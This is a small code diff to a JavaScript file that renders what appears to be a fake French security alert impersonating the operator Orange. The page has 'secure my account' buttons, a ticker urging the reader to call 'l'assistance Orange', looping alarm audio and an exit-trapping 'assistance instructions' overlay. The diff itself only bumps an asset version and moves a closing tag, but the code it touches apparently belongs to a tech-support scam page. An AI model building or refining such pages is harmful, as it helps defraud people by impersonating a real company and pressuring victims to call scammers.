@@ -2,7 +2,7 @@
   var mount = document.getElementById("app-mount");
   if (!mount) return;
 
-  var ASSET_VERSION = "5";
+  var ASSET_VERSION = "6";
 
   var styleLink = document.querySelector('link[href*="styles.css"]');
   if (!styleLink) {
@@ -112,8 +112,8 @@
     '<p>Heure : Aujourd\'hui, <span id="currentTime"></span></p></div></div></div>' +
     '<div class="modal-bottom"><div class="modal-actions" role="group" aria-label="Actions">' +
     '<button class="modal-btn modal-btn-allow" id="secureAccountBtn" type="button">Sécuriser mon compte</button>' +
-    '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
-    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Appellez l\'assistance Orange</p></div>' +
+    '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main>' +
+    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Appellez l\'assistance Orange</p></div></div>' +
     '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
     '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>' +
     '<div id="escapeExitModal" class="escape-exit-overlay" aria-hidden="true" role="dialog" aria-label="Instructions assistance">' +
